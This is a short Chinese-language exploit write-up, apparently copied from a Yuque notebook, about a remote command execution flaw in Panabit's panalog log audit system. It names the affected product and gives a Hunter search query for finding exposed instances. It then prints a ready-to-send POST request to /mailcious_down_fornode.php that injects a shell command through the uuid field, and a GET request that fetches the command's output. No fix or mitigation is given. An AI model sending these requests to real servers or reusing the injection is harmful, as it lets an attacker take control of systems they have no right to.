# panabit日志审计系统mailcious_down_fornode远程命令执行漏洞

# 一、漏洞简介
panalog为北京派网软件有限公司，一款流量分析，日志分析管理的一款软件。panabit日志审计系统mailcious_down_fornode远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ Panabit panalog

# 三、资产测绘
+ hunter`app.name="Panabit 日志系统"`
+ 特征

![1699191878681-4fe56d76-6ee5-4a90-af37-1cf8a983f57f.png](./img/PDxyT-yAQSiNXykj/1699191878681-4fe56d76-6ee5-4a90-af37-1cf8a983f57f-247645.png)

# 四、漏洞复现
```java
POST /mailcious_down_fornode.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
Content-Length: 40
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1,192.168.170.105,172.10.107.143

action=check&uuid=;whoami > pobjejsh.txt
```

![1708524892745-3b5bf667-ecd6-4a9b-bbce-5c21566165de.png](./img/PDxyT-yAQSiNXykj/1708524892745-3b5bf667-ecd6-4a9b-bbce-5c21566165de-715574.png)

获取命令执行结果

```java
GET /pobjejsh.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
Connection: close
Content-Type: text/plain
Accept-Encoding: gzip, deflate
```

![1708524929552-5534bed2-5da0-4c33-a551-21bc90dbe0ec.png](./img/PDxyT-yAQSiNXykj/1708524929552-5534bed2-5da0-4c33-a551-21bc90dbe0ec-650538.png)[panabit-mailcious-down-fornode-远程命令执行.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222233874-8275a922-bf36-45a6-b083-4536ea247db0.yaml)





> 更新: 2024-02-29 23:57:14  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qkhnzs3bu0s8zxxn>